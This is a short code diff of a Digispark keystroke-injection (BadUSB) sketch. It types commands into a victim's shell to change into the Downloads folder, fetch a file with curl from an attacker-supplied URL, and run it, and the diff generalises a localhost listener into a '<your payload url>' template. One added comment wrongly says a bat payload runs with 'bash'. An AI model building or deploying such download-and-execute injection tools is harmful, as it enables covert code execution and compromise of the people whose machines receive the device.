@@ -13,10 +13,15 @@ void setup() {
   DigiKeyboard.print("cd %userprofile%\\Downloads");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(1000);
-  DigiKeyboard.print("curl -O http://localhost/testingfiles/listener.py");
+  DigiKeyboard.print("curl -O <your payload url>");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(2000);
-  DigiKeyboard.print("python listener.py");
+  // *Note*
+  // if your payload is written in python, then
+  DigiKeyboard.print("python <payload name>");
+  // if your payload is a bat, then
+  DigiKeyboard.print("bash <payload name>");
+
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(1000);
   DigiKeyboard.print("exit");
